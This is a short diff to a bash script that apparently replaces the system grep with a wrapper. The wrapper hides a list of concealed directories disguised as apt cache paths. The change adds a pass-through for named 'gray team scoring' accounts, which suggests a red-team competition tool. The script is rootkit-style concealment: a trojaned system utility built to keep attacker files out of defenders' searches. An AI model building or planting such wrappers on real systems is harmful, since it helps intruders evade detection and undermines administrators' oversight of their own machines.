@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_GREP="/usr/bin/grep"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_GREP "$@" ;;
+esac
+
+
 HIDDEN_PATHS=(
     "/var/lib/apt/lists/.cache"
     "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
